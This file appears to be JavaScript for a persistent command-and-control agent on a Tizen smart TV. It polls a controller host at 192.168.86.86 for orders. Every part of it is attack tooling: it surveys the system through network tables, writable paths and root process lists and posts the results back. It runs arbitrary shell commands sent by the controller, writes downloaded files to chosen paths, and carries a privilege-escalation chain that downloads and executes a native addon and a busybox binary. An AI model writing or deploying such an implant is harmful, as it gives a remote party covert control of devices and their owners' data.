/* TV Recon v9 — LONG-LIVED RESIDENT AGENT.
 * Runs in the TizenBrew service vm context. No crash markers, no throws —
 * a single resident module with a polling loop. Orders from /mode:
 *   {"action":"recon"}   light status posts
 *   {"action":"exec","cmd":"..."}   run command, post output
 *   {"action":"stop"}    idle (no posts)
 * ES5. Every callback wrapped — an async throw would kill the whole service. */
'use strict';

var MAC = '192.168.86.86';
var PORT = 8080;
var fs = require('fs');
var http = require('http');

var lastModeStr = '';
var executedNonces = {};
var busy = false;

var AGENT_ID = T(function () { return fs.readFileSync('/proc/self/cmdline', 'utf8').split(' ')[0]; }) + ':' + process.pid;
function post(tag, data) {
    try {
        var body = JSON.stringify({ tag: tag, agent: AGENT_ID, data: data });
        if (body.length > 400000) body = JSON.stringify({ tag: tag, data: '(too big)' });
        var req = http.request({
            host: MAC, port: PORT, path: '/report', method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
        });
        req.on('error', function () {});
        req.end(body);
    } catch (e) {}
}
function T(fn) { try { return fn(); } catch (e) { return 'ERR:' + (e && e.message ? e.message : String(e)); } }
function read(f, n) { return T(function () { return fs.readFileSync(f, 'utf8').slice(0, n || 6000); }); }
function ls(d) { return T(function () { return fs.readdirSync(d).slice(0, 250); }); }

console.log('TV Recon v9 resident agent starting');
post('v9-online', { time: new Date().toISOString(), uid: process.getuid(), node: process.version });

function getMode(cb) {
    try {
        var req = http.request({ host: MAC, port: PORT, path: '/mode', method: 'GET' }, function (res) {
            var b = '';
            res.on('data', function (c) { b += c; });
            res.on('end', function () {
                try { cb(JSON.parse(b)); } catch (e) { cb(null); }
            });
        });
        req.on('error', function () { cb(null); });
        req.end();
    } catch (e) { cb(null); }
}

var seenOnce = {};
function once(key, fn) { if (!seenOnce[key]) { seenOnce[key] = true; fn(); } }

function doRecon(mode) {
    /* one-time full map (delivered once per service lifetime), then light status */
    once('net', function () {
        post('net-unix', read('/proc/net/unix', 12000));
        post('net-tcp', read('/proc/net/tcp', 6000));
        post('net-udp', read('/proc/net/udp', 3000));
    });
    once('writable', function () {
        var wr = {};
        ['/tmp', '/home/owner/share/tmp/sdk_tools', '/home/owner/share/tmp', '/home/owner',
         '/dev/shm', '/run/user/5001', '/opt/usr/home/owner', '/home/owner/data',
         '/home/owner/content', '/home/owner/.cache', '/home/owner/apps_rw'].forEach(function (d) {
            wr[d] = T(function () { var t = d + '/.__tvr'; fs.writeFileSync(t, '1'); fs.unlinkSync(t); return 'WRITE_OK'; });
        });
        post('writable', wr);
    });
    once('dirs', function () {
        ['/opt/etc', '/usr/share/chromium-efl/upgrade', '/var', '/usr/lib/systemd/system',
         '/etc/systemd/system', '/run/user/5001', '/opt/usr/apps/xvvl3S1bvH',
         '/opt/usr/apps', '/var/cynara', '/var/lib', '/etc/sysmgr'].forEach(function (d) {
            post('fs', { dir: d, listing: ls(d) });
        });
    });
    once('marker', function () {
        post('native-marker-unconditional', read('/tmp/.nativenow', 2000));
    });
    once('smack', function () {
        post('smack-load2', read('/sys/fs/smackfs/load2', 16000));
    });
    if (mode.deep) {
        /* full procmap only on demand */
        once('procmap', function () {
            var pids = T(function () { return fs.readdirSync('/proc').filter(function (x) { return /^[0-9]+$/.test(x); }); });
            var procs = [];
            if (pids instanceof Array) {
                for (var k = 0; k < pids.length; k++) {
                    var pid = pids[k];
                    var s = T(function () { return fs.readFileSync('/proc/' + pid + '/status', 'utf8'); });
                    if (typeof s !== 'string') continue;
                    var name = (s.match(/^Name:\s*(.*)/m) || [0, '?'])[1];
                    var uid = (s.match(/^Uid:\s*(\d+)/m) || [0, '?'])[1];
                    if (uid !== '0' && uid !== '5001') continue;
                    if (name && /^(kworker|migration|ksoftirqd|watchdog|rcu_|kthrotld|irq|mmc_|scsi_|zswap|loop|nfit|bioset|kblockd)/.test(name)) continue;
                    var cmd = T(function () { return fs.readFileSync('/proc/' + pid + '/cmdline', 'utf8').replace(/\0/g, ' ').slice(0, 130); });
                    procs.push({ pid: pid, name: name, uid: uid, cmd: cmd });
                    if (procs.length >= 220) break;
                }
            }
            for (var c = 0; c < procs.length; c += 25) {
                post('procs', { chunk: c / 25, total: procs.length, list: procs.slice(c, c + 25) });
            }
        });
    }
    post('heartbeat', { t: new Date().toISOString(), busy: busy });
}

function doExec(mode) {
    if (busy) { post('exec-busy', true); return; }
    busy = true;
    try {
        var cp = require('child_process');
        post('exec-start', { cmd: mode.cmd });
        cp.exec(mode.cmd, { timeout: 20000, maxBuffer: 600000 }, function (err, stdout, stderr) {
            try {
                var out = String(stdout || '');
                var errS = String(stderr || '');
                var CH = 3500, i;
                for (i = 0; i < out.length; i += CH) post('exec-out', { i: i / CH, s: out.slice(i, i + CH) });
                for (i = 0; i < errS.length; i += CH) post('exec-err', { i: i / CH, s: errS.slice(i, i + CH) });
                post('exec-done', {
                    rc: err ? (err.code !== undefined ? err.code : String(err)) : 0,
                    outLen: out.length, errLen: errS.length
                });
            } catch (e) { post('exec-post-fail', String(e)); }
            busy = false;
        });
    } catch (e) {
        post('exec-fail', String(e));
        busy = false;
    }
}

function doSpawn(mode) {
    if (busy) { post('spawn-busy', true); return; }
    busy = true;
    try {
        var cp = require('child_process');
        var args = mode.args || [];
        post('spawn-start', { file: mode.file, args: args });
        var child = cp.spawn(mode.file, args, { timeout: 20000 });
        var out = '', errS = '';
        child.stdout.on('data', function (d) { out += d.toString(); });
        child.stderr.on('data', function (d) { errS += d.toString(); });
        child.on('error', function (e) {
            post('spawn-done', { err: String(e), code: e && e.code, outLen: out.length, errLen: errS.length });
            post('spawn-out', { s: out.slice(0, 3500) });
            post('spawn-err', { s: errS.slice(0, 3500) });
            busy = false;
        });
        child.on('close', function (code) {
            post('spawn-out', { s: out.slice(0, 3500) });
            post('spawn-err', { s: errS.slice(0, 3500) });
            post('spawn-done', { code: code, outLen: out.length, errLen: errS.length });
            busy = false;
        });
    } catch (e) {
        post('spawn-fail', String(e));
        busy = false;
    }
}

function doWritefile(mode) {
    try {
        post('fetch-start', { url: mode.url, path: mode.path, mode: mode.mode });
        var req = http.request(mode.url, function (res) {
            var chunks = [];
            res.on('data', function (c) { chunks.push(c); });
            res.on('end', function () {
                try {
                    var buf = Buffer.concat(chunks);
                    fs.writeFileSync(mode.path, buf);
                    if (mode.mode) fs.chmodSync(mode.path, mode.mode);
                    post('fetch-done', { bytes: buf.length, path: mode.path });
                } catch (e) { post('fetch-fail', 'write: ' + String(e)); }
            });
        });
        req.on('error', function (e) { post('fetch-fail', String(e)); });
        req.end();
    } catch (e) { post('fetch-fail', String(e)); }
}

function doExploit(mode) {
    /* Choreographed escalation train, one boot:
     * 1. download N-API addon  2. require() it  3. read constructor marker
     * 4. call probe()          5. download busybox  6. spawn busybox id (may kill)
     */
    if (busy) { post('exploit-busy', true); return; }
    busy = true;
    post('exploit-start', { step: 'fetch-addon' });
    try {
        var req = http.request('http://' + MAC + ':' + PORT + '/files/addon.node', function (res) {
            var chunks = [];
            res.on('data', function (c) { chunks.push(c); });
            res.on('end', function () {
                try {
                    var buf = Buffer.concat(chunks);
                    fs.writeFileSync('/tmp/x.node', buf);
                    post('exploit-addon-saved', { bytes: buf.length });
                    /* THE MOMENT: dlopen via require() */
                    var addon = require('/tmp/x.node');
                    post('exploit-addon-loaded', { typeOf: typeof addon, keys: T(function () { return Object.keys(addon); }) });
                    /* constructor should have written the marker */
                    var marker = read('/tmp/.nativenow', 2000);
                    post('exploit-native-marker', marker);
                    if (addon && addon.probe) {
                        post('exploit-probe', T(function () { return String(addon.probe()); }));
                    }
                    /* step 2: busybox upload */
                    var req2 = http.request('http://' + MAC + ':' + PORT + '/files/busybox', function (res2) {
                        var chunks2 = [];
                        res2.on('data', function (c) { chunks2.push(c); });
                        res2.on('end', function () {
                            try {
                                var buf2 = Buffer.concat(chunks2);
                                fs.writeFileSync('/tmp/bb', buf2);
                                fs.chmodSync('/tmp/bb', 493);
                                post('exploit-busybox-saved', { bytes: buf2.length });
                                /* step 3: spawn test — the potentially lethal one, LAST */
                                var cp = require('child_process');
                                post('exploit-spawn-start', {});
                                var child = cp.spawn('/tmp/bb', ['id'], { timeout: 15000 });
                                var out = '', errS = '';
                                child.stdout.on('data', function (d) { out += d.toString(); });
                                child.stderr.on('data', function (d) { errS += d.toString(); });
                                child.on('error', function (e) {
                                    post('exploit-spawn-done', { err: String(e), code: e && e.code, out: out.slice(0, 2000), errS: errS.slice(0, 1000) });
                                    busy = false;
                                });
                                child.on('close', function (code) {
                                    post('exploit-spawn-done', { code: code, out: out.slice(0, 2000), errS: errS.slice(0, 1000) });
                                    busy = false;
                                });
                            } catch (e) {
                                post('exploit-busybox-err', String(e));
                                busy = false;
                            }
                        });
                    });
                    req2.on('error', function (e) { post('exploit-busybox-err', 'fetch: ' + String(e)); busy = false; });
                    req2.end();
                } catch (e) {
                    post('exploit-addon-err', String(e));
                    busy = false;
                }
            });
        });
        req.on('error', function (e) { post('exploit-addon-err', 'fetch: ' + String(e)); busy = false; });
        req.end();
    } catch (e) {
        post('exploit-outer-err', String(e));
        busy = false;
    }
}

function tick() {
    try {
        getMode(function (mode) {
            try {
                if (!mode || !mode.action) { mode = { action: 'recon' }; }
                var ms = JSON.stringify(mode);
                if (ms !== lastModeStr) {
                    lastModeStr = ms;
                    post('mode', mode);
                }
                /* ONE-SHOT: nonce guard — skip dispatch but ALWAYS reschedule */
                var nonce = mode.nonce || null;
                var alreadyRan = false;
                if (nonce) {
                    if (executedNonces[nonce]) { alreadyRan = true; }
                    else {
                        /* cross-agent file lock in shared /tmp */
                        var lock = '/tmp/.lock_' + nonce;
                        try {
                            fs.openSync(lock, 'wx');
                            executedNonces[nonce] = 1;
                        } catch (e) { alreadyRan = true; }
                    }
                }
                if (!alreadyRan) {
                if (mode.action === 'exec') doExec(mode);
                else if (mode.action === 'spawn') doSpawn(mode);
                else if (mode.action === 'writefile') doWritefile(mode);
                else if (mode.action === 'exploit') doExploit(mode);
                else if (mode.action === 'die') { post('dying', true); setTimeout(function () { throw new Error('UPDATE_RESTART'); }, 100); }
                else if (mode.action === 'stop') { /* idle */ }
                else doRecon(mode);
                }
            } catch (e) { post('tick-err', String(e)); }
            setTimeout(tick, 5000);
        });
    } catch (e) {
        try { post('tick-outer-err', String(e)); } catch (e2) {}
        setTimeout(tick, 5000);
    }
}
tick();

/* keep the vm context alive forever — never throw */
